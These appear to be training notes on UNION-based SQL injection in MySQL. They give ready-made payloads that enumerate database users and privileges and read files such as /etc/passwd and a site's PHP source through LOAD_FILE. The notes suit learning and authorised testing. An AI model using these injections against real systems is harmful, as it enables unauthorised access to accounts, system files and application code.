## Privileges
* DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files

#### DB User
* First determine which user we are
* We do not necessarily need database administrator (DBA) privileges to read data

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

#### User Privileges
```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

* If there are multiple users in the DBMS

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

* Dump additional privileges

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
```

## LOAD_FILE
```sql
SELECT LOAD_FILE('/etc/passwd');
```

**Note**: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

## Another Example
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

